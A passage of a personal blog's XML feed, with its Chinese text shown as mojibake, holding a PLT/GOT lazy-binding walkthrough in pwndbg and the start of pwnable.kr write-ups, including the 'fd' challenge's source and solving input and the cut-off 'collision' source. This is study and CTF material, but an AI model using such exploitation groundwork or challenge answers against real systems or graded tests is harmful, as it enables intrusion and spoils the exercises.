&#125;</span></span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;è°ƒè¯•ä¸€ä¸‹cè¯­è¨€ç¨‹åº&lt;/h1&gt;
&lt;p&gt;è‡ªæˆ‘æ„Ÿè§‰å¾ˆä¹…æ²¡å†™Cè¯­è¨€äº†&lt;/p&gt;
&lt;h2&gt;getcharå‡½æ•°&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;lin
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="C" scheme="https://prontosil.club/tags/C/"/>
    
      <category term="ç¼“å†²åŒº" scheme="https://prontosil.club/tags/%E7%BC%93%E5%86%B2%E5%8C%BA/"/>
    
      <category term="getchar" scheme="https://prontosil.club/tags/getchar/"/>
    
      <category term="x86" scheme="https://prontosil.club/tags/x86/"/>
    
  </entry>
  
  <entry>
    <title>blog æ›´æ–°å°è®°</title>
    <link href="https://prontosil.club/2019/07/30/blog-%E6%9B%B4%E6%96%B0%E5%B0%8F%E8%AE%B0/"/>
    <id>https://prontosil.club/2019/07/30/blog-æ›´æ–°å°è®°/</id>
    <published>2019-07-30T14:37:09.000Z</published>
    <updated>2019-07-30T14:59:41.662Z</updated>
    
    <content type="html"><![CDATA[<h2>æ›´æ–°</h2><p>ç®€å•åœ°æ›´æ–°äº†ä¸€ä¸‹è‡ªå·±çš„blogï¼Œè™½ç„¶æ˜¯è¿™ä¹ˆè¯´ï¼Œä½†æ˜¯å®é™…ä¸Šè¿˜æ˜¯èŠ±äº†ä¸å°‘æ—¶é—´æ¥å®Œå–„ï¼Œä¸»è¦æœ‰ï¼š</p><ul><li>ä¿®æ”¹äº†ä»£ç çš„é«˜äº®æ ¼å¼ï¼Œé»‘è‰²çš„ä¸»é¢˜æ›´å¥½çœ‹ä¸€äº›</li><li>æ›´æ¢äº†blogçš„markdownå¼•æ“ï¼Œå¯ä»¥æ¸²æŸ“emojäº†</li><li>ä¿®æ”¹äº†è‡ªæˆ‘ä»‹ç»ï¼Œå»æ‰äº†ç½‘æ˜“äº‘éŸ³ä¹çš„å¤–é“¾ï¼Œå› ä¸ºå¤±æ•ˆäº†ï¼ŒåŒæ—¶æ·»åŠ äº†ç®€ä¹¦å’ŒçŸ¥ä¹é“¾æ¥</li><li>æ·»åŠ äº†å‹é“¾</li><li>æ·»åŠ äº†è¯„è®ºgitment</li></ul><h2><em>TODO</em></h2><p>æœç´¢åŠŸèƒ½æ²¡æœ‰æ²¡æ³•ç”¨</p><p>blogè¿˜å¯ä»¥æ›´ç¾åŒ–ä¸€ç‚¹</p><h2>ä¸€ç‚¹æ„Ÿæƒ³</h2><p>å–œæ¬¢è‡ªå·±æ­å»ºçš„è¿™ä¸ªå°å¤©åœ°ï¼Œè™½ç„¶æœ‰è¿™ä¹ˆæˆ–è€…é‚£ä¹ˆçš„ä¸å®Œå–„ï¼Œä½†æ˜¯è¿™ä¸ªblogè§è¯ç€æˆ‘çš„æˆé•¿ï¼</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;æ›´æ–°&lt;/h2&gt;
&lt;p&gt;ç®€å•åœ°æ›´æ–°äº†ä¸€ä¸‹è‡ªå·±çš„blogï¼Œè™½ç„¶æ˜¯è¿™ä¹ˆè¯´ï¼Œä½†æ˜¯å®é™…ä¸Šè¿˜æ˜¯èŠ±äº†ä¸å°‘æ—¶é—´æ¥å®Œå–„ï¼Œä¸»è¦æœ‰ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¿®æ”¹äº†ä»£ç çš„é«˜äº®æ ¼å¼ï¼Œé»‘è‰²çš„ä¸»é¢˜æ›´å¥½çœ‹ä¸€äº›&lt;/li&gt;
&lt;li&gt;æ›´æ¢äº†blogçš„markdownå¼•æ“ï¼Œå¯ä»¥æ¸²æŸ“emojäº†&lt;/li&gt;
&lt;l
      
    
    </summary>
    
      <category term="config" scheme="https://prontosil.club/categories/config/"/>
    
    
      <category term="blog" scheme="https://prontosil.club/tags/blog/"/>
    
      <category term="hexo" scheme="https://prontosil.club/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>èŠèŠpltä¸got</title>
    <link href="https://prontosil.club/2019/07/24/%E8%81%8A%E8%81%8Aplt%E4%B8%8Egot/"/>
    <id>https://prontosil.club/2019/07/24/èŠèŠpltä¸got/</id>
    <published>2019-07-24T12:46:14.000Z</published>
    <updated>2019-07-24T12:50:39.853Z</updated>
    
    <content type="html"><![CDATA[<h1>æ·±å…¥ç†è§£pltå’Œgot</h1><p>å…ˆå†™ä¸€æ®µä»£ç ï¼š</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Build with: gcc -m32 --no-pie -g -o plt plt.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hello world!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é€”ä¸­é‡åˆ°äº†ä¸€ä¸ªæŠ¥é”™ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In file included from /usr/include/stdio.h:27:0,</span><br><span class="line">                 from plt.c:3:</span><br><span class="line">/usr/include/features.h:374:25: fatal error: sys/cdefs.h: No such file or directory</span><br><span class="line"> #  include &lt;sys/cdefs.h&gt;</span><br></pre></td></tr></table></figure></p><p>ç„¶åå®‰è£…ä¸€ä¸ª:<code>apt install libc6-dev-i386</code></p><p>ç¼–è¯‘å¥½ç¨‹åºä¹‹å</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec plt     </span><br><span class="line">[*] &apos;/home/pxy/pwnable/plt&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p><p>ç¨‹åºæ˜¯æ²¡æœ‰pieçš„</p><p><code>readelf -S plt</code>æŸ¥çœ‹èŠ‚è¡¨</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[12] .plt              PROGBITS        08048300 000300 000050 04  AX  0   0 16</span><br><span class="line">[13] .text             PROGBITS        08048350 000350 000192 00  AX  0   0 16</span><br><span class="line">[22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">[23] .got.plt          PROGBITS        0804a000 001000 00001c 04  WA  0   0  4</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°ï¼š</p><ul><li>.plt åŸºåœ°å€ä¸ºï¼š <code>0x08048300</code></li><li>.got åŸºåœ°å€ä¸ºï¼š <code>0x08049ffc</code></li><li>.got.plt åŸºåœ°å€ä¸ºï¼š <code>0x0x804a000</code></li></ul><p>æˆ‘ä»¬ä»è°ƒç”¨putså‡½æ•°é‚£é‡Œå¼€å§‹å•æ­¥æ‰§è¡Œ</p><p>é¦–å…ˆè·³è½¬åˆ°pltè¡¨ä¸­<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x804845d &lt;main+16&gt;               call   puts@plt &lt;0x8048310&gt;</span><br><span class="line">0x8048310  &lt;puts@plt&gt;                  jmp    dword ptr [puts@got.plt] &lt;0x804a00c&gt;</span><br></pre></td></tr></table></figure></p><p>call putsä¹‹åï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤ä¹Ÿæ˜¯ä¸€ä¸ªè·³è½¬</p><p><code>jmp dword ptr [puts@got.plt] &lt;0x804a00c&gt;</code>è¿™æ¡æŒ‡ä»¤çš„æ„æ€æ˜¯å–å‡º<code>puts@got.plt</code>è¡¨ä¸­çš„å€¼ï¼Œæ”¾åˆ°pcå¯„å­˜å™¨ä¸­</p><p>æ‰€ä»¥ï¼ŸæŸ¥çœ‹ä¸€ä¸‹æ­¤å¤„å†…å­˜çš„å€¼ï¼š</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2x 0x804a00c</span><br><span class="line">0x804a00c &lt;puts@got.plt&gt;:0x080483160x08048326</span><br></pre></td></tr></table></figure></p><p>æ‰€ä»¥ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å°±æ˜¯<code>0x08048316</code>è¿˜æ˜¯åœ¨pltè¡¨ä¸­</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â–º 0x8048316  &lt;puts@plt+6&gt;                push   0</span><br><span class="line">  0x804831b  &lt;puts@plt+11&gt;               jmp    0x8048300</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œå…ˆå°†0æ”¾åˆ°æ ˆä¸Šï¼Œè¡¨æ˜æ˜¯è¦è§£æputså‡½æ•°çš„åœ°å€ï¼Œç„¶åå†è·³è½¬åˆ°<code>0x8048300</code>ä¹Ÿå°±æ˜¯pltè¡¨çš„å¼€å§‹éƒ¨åˆ†</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â–º 0x8048300                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">  0x8048306                              jmp    dword ptr [0x804a008] &lt;0xf7ff0650&gt;</span><br></pre></td></tr></table></figure></p><p>è¿™æ—¶å€™å…ˆæŠŠ.got.pltè¡¨ä¸­çš„ç¬¬äºŒé¡¹æ”¾åˆ°æ ˆä¸Šå…ˆæŸ¥çœ‹ä¸€ä¸‹.got.pltä¸­å‰ä¸‰é¡¹çš„å†…å®¹:</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/3x 0x804a000</span><br><span class="line">0x804a000:0x08049f140xf7ffd9380xf7ff0650</span><br></pre></td></tr></table></figure></p><p>å°†<code>0xf7ffd938</code>æ”¾ç½®åˆ°æ ˆä¸Šï¼Œç„¶åè·³è½¬åˆ°.got.pltä¸­çš„ç¬¬ä¸‰é¡¹ï¼Œä¹Ÿå°±æ˜¯<code>0xf7ff0650</code>ï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯<code>_dl_runtime_resolve</code>å‡½æ•°çš„åœ°å€è´Ÿè´£è§£æå‡½æ•°çš„åœ°å€</p><p>æ­¤æ—¶æˆ‘ä»¬çš„gotè¡¨å†…å®¹å¦‚ä¸‹ï¼š</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT functions: 4</span><br><span class="line"></span><br><span class="line">[0x804a00c] puts -&gt; 0x8048316 (puts@plt+6) â—‚â€” push   0 /* &apos;h&apos; */</span><br><span class="line">[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) â—‚â€” push   8</span><br><span class="line">[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) â—‚â€” push   0x10</span><br><span class="line">[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) â—‚â€” push   ebp</span><br></pre></td></tr></table></figure></p><p>putså‡½æ•°çš„åœ°å€è¿˜æ²¡æœ‰é‡å®šä½</p><p>å½“æˆ‘ä»¬æ‰§è¡Œè¿‡ä¸€éputså‡½æ•°ä¹‹åè¿™æ—¶å€™å›è¿‡å¤´æ¥ç»§ç»­æŸ¥çœ‹gotè¡¨ä¸­çš„å†…å®¹ï¼š</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT functions: 4</span><br><span class="line"></span><br><span class="line">[0x804a00c] puts -&gt; 0xf7e727e0 (puts) â—‚â€” push   ebp</span><br><span class="line">[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) â—‚â€” push   8</span><br><span class="line">[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) â—‚â€” push   0x10</span><br><span class="line">[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) â—‚â€” push   ebp</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°åœ°å€å·²ç»é‡å®šä½å¥½äº†</p><p>è¿™å’ŒWindowsçš„PEæ–‡ä»¶æ ¼å¼ä¼¼ä¹æœ‰ç‚¹ä¸åŒäº†ï¼ŒPEæ–‡ä»¶æ˜¯è£…è½½è¿›å†…å­˜ä¹‹åå‡½æ•°åœ°å€éƒ½å·²ç»é‡å®šä½å¥½äº†ï¼Œè€ŒLinuxçš„elfæ–‡ä»¶åˆšåˆšè£…è¿›å†…å­˜ä¹‹åå‡½æ•°çš„åœ°å€è¿˜æ˜¯ä¸ç¡®å®šçš„ï¼Œéœ€è¦åœ¨è¿è¡Œçš„æ—¶å€™è¿›è¡Œé‡å®šä½ã€‚</p><p>å½“æˆ‘ä»¬å°†ä»£ç ä¿®æ”¹ä¸ºå¦‚ä¸‹æ—¶ï¼š</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; l <span class="number">1</span>, <span class="number">20</span></span><br><span class="line"><span class="comment">// Build with: gcc -m32 -no-pie -g -o plt plt.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hello world!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"hello world again !!!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç¬¬ä¸€æ¬¡è°ƒç”¨<code>puts</code>å‡½æ•°ä¹‹åï¼š<code>[0x804a00c] puts -&gt; 0xf7e727e0 (puts) â—‚â€” push ebp</code></p><p>putså‡½æ•°åœ°å€å·²ç»é‡å®šä½å¥½äº†</p><p>æ¥ä¸‹æ¥å†æ¬¡è°ƒç”¨putså‡½æ•°</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â–º 0x8048310  &lt;puts@plt&gt;    jmp    dword ptr [0x804a00c] &lt;0xf7e727e0&gt;</span><br><span class="line">   â†“</span><br><span class="line">  0xf7e727e0 &lt;puts&gt;        push   ebp</span><br><span class="line">  0xf7e727e1 &lt;puts+1&gt;      push   edi</span><br><span class="line">  0xf7e727e2 &lt;puts+2&gt;      push   esi</span><br><span class="line">  0xf7e727e3 &lt;puts+3&gt;      push   ebx</span><br></pre></td></tr></table></figure></p><p>æ­¤æ—¶å¯ä»¥çœ‹åˆ°ç›´æ¥å°±è·³åˆ°å‡½æ•°çš„åœ°å€äº†å› ä¸ºæ­¤æ—¶çš„.got.pltå·²ç»æ˜¯putså‡½æ•°çš„åœ°å€äº†ï¼Œ Linux tql</p><h1>æ•´ç†ä¸€ä¸‹</h1><p>ä¹‹å‰çœ‹å‚è€ƒèµ„æ–™ä¸­åšä¸»çš„æ–‡ç« ä¸€ç›´æ²¡æœ‰å¾ˆç†è§£ï¼Œè¿™é‡Œç›´æ¥ç»Ÿä¸€è¯´ä¸€ä¸‹æˆ‘çš„ç†è§£ï¼š</p><h2>ä½•è°“PLTä¸GOT</h2><p>å…¶å®è¿™é‡Œå‡†ç¡®çš„æ¥è¯´åº”è¯¥å«got.pltè€Œä¸æ˜¯å«gotï¼Œä¸è¿‡ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬è¿˜æ˜¯å«å®ƒgotè¡¨å§</p><p><img src="/assets/got0_bmqvjb601" alt="got0">è¦æ³¨æ„é‚£ä¸ª<code>jmp *printf@got</code> *å·æ˜¯å–å‡ºåœ°å€å¤„çš„å€¼ï¼Œå¹¶ä¸æ˜¯è·³åˆ°gotè¡¨ä¸­å»</p><h2>å»¶è¿Ÿé‡å®šä½</h2><p>è¿™ç¯‡æ–‡ç« æˆ‘è§‰å¾—å†™çš„å¾ˆç²¾å½©</p><p>Linuxä¸ºäº†ç¼©å‡ä»£ç ,å°±æ˜¯æŒ‰ç…§è¿™ç§æ¨¡å¼æ¥çš„ï¼š</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *<span class="built_in">printf</span>@got            <span class="comment">// é“¾æ¥å™¨å°†printf@gotå¡«æˆä¸‹ä¸€è¯­å¥lookup_printfçš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">lookup_printf:</span><br><span class="line">        è°ƒç”¨é‡å®šä½å‡½æ•°æŸ¥æ‰¾<span class="built_in">printf</span>åœ°å€ï¼Œå¹¶å†™åˆ°<span class="built_in">printf</span>@got</span><br><span class="line"></span><br><span class="line">        <span class="keyword">goto</span> address_good;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¹Ÿå°±å’Œä¸Šé¢é‚£å¼ å›¾æ˜¯ä¸€ä¸€å¯¹åº”çš„</p><h2>å…¬å…±gotè¡¨é¡¹</h2><p>åœ¨è§£æå‡½æ•°çš„çœŸæ­£åœ°å€æ—¶ï¼Œ <code>_dl_runtime_resolve</code>æ˜¯æ€ä¹ˆçŸ¥é“å®ƒè¦è§£æå“ªä¸ªå‡½æ•°çš„</p><p>å› ä¸ºï¼š</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf@plt&gt;:</span><br><span class="line">   jmp *0x80496f8</span><br><span class="line">   push $0x00</span><br><span class="line">   jmp common@plt</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œpushçš„å€¼ä¸ä¸€æ ·ï¼Œç›¸å½“äºå°±æ˜¯æ¯ä¸ªå‡½æ•°å–äº†ä¸€ä¸ªid</p><p>ä¹‹åå°±æ˜¯å…¬å…±gotè¡¨çš„å†…å®¹ï¼š</p><ul><li>got[0]: æœ¬ELFåŠ¨æ€æ®µ(.dynamicæ®µï¼‰çš„è£…è½½åœ°å€</li><li>got[1]ï¼šæœ¬ELFçš„link_mapæ•°æ®ç»“æ„æè¿°ç¬¦åœ°å€</li><li>got[2]ï¼š_dl_runtime_resolveå‡½æ•°çš„åœ°å€</li></ul><h2>ç©¿é’ˆå¼•çº¿</h2><p><img src="/assets/got1_8tzb6jmh9" alt="got1"></p><blockquote><p>PLTè¡¨ä¸­çš„ç¬¬ä¸€é¡¹ä¸ºå…¬å…±è¡¨é¡¹ï¼Œå‰©ä¸‹çš„æ˜¯æ¯ä¸ªåŠ¨æ€åº“å‡½æ•°ä¸ºä¸€é¡¹ï¼ˆå½“ç„¶æ¯é¡¹æ˜¯ç”±å¤šæ¡æŒ‡ä»¤ç»„æˆçš„ï¼Œjmp *0xXXXXXXXXè¿™æ¡æŒ‡ä»¤æ˜¯æ‰€æœ‰pltçš„å¼€å§‹æŒ‡ä»¤ï¼‰æ¯é¡¹PLTéƒ½ä»å¯¹åº”çš„GOTè¡¨é¡¹ä¸­è¯»å–ç›®æ ‡å‡½æ•°åœ°å€</p></blockquote><blockquote><p>GOTè¡¨ä¸­å‰3ä¸ªä¸ºç‰¹æ®Šé¡¹ï¼Œåˆ†åˆ«ç”¨äºä¿å­˜ .dynamicæ®µåœ°å€ã€æœ¬é•œåƒçš„link_mapæ•°æ®ç»“æ„åœ°å€å’Œ_dl_runtime_resolveå‡½æ•°åœ°å€ï¼›ä½†åœ¨ç¼–è¯‘æ—¶ï¼Œæ— æ³•è·å–çŸ¥é“link_mapåœ°å€å’Œ_dl_runtime_resolveå‡½æ•°åœ°å€ï¼Œæ‰€ä»¥ç¼–è¯‘æ—¶å¡«é›¶åœ°å€ï¼Œè¿›ç¨‹å¯åŠ¨æ—¶ç”±åŠ¨æ€é“¾æ¥å™¨è¿›è¡Œå¡«å……</p></blockquote><h1>å‚è€ƒ</h1><p><a href="https://blog.csdn.net/linyt/article/details/51635768?from=singlemessage" target="_blank" rel="noopener">èŠèŠLinuxåŠ¨æ€é“¾æ¥ä¸­çš„PLTå’ŒGOTï¼ˆï¼‘ï¼‰â€”â€”ä½•è°“PLTä¸GOT</a><a href="https://blog.csdn.net/linyt/article/details/51636753" target="_blank" rel="noopener">èŠèŠLinuxåŠ¨æ€é“¾æ¥ä¸­çš„PLTå’ŒGOTï¼ˆï¼’ï¼‰â€”â€”å»¶è¿Ÿé‡å®šä½</a><a href="https://blog.csdn.net/linyt/article/details/51637832" target="_blank" rel="noopener">èŠèŠLinuxåŠ¨æ€é“¾æ¥ä¸­çš„PLTå’ŒGOTï¼ˆï¼“ï¼‰â€”â€”å…¬å…±GOTè¡¨é¡¹</a><a href="https://blog.csdn.net/linyt/article/details/51893258" target="_blank" rel="noopener">èŠèŠLinuxåŠ¨æ€é“¾æ¥ä¸­çš„PLTå’ŒGOTï¼ˆ4ï¼‰â€”â€” ç©¿é’ˆå¼•çº¿</a><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" target="_blank" rel="noopener">GOT and PLT for pwning.</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;æ·±å…¥ç†è§£pltå’Œgot&lt;/h1&gt;
&lt;p&gt;å…ˆå†™ä¸€æ®µä»£ç ï¼š&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span c
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="ctf" scheme="https://prontosil.club/tags/ctf/"/>
    
      <category term="pwn" scheme="https://prontosil.club/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable</title>
    <link href="https://prontosil.club/2019/07/24/pwnable/"/>
    <id>https://prontosil.club/2019/07/24/pwnable/</id>
    <published>2019-07-24T12:46:03.000Z</published>
    <updated>2019-07-24T12:49:36.285Z</updated>
    
    <content type="html"><![CDATA[<h1>pwnableä»å°ç™½å¼€å§‹</h1><p>pwnableæ˜¯ä¸€ä¸ªé€‚åˆå°ç™½çš„ç½‘ç«™</p><p>https://pwnable.kr/play.php</p><h2>fd</h2><p>æœ‰æºç ï¼š</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é“é¢˜ç›®æ˜¯è®©ä½ äº†è§£Linuxä¸‹çš„æ–‡ä»¶æè¿°ç¬¦<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd@prowl:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br><span class="line">fd@prowl:~$</span><br></pre></td></tr></table></figure></p><h2>collision</h2><p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* 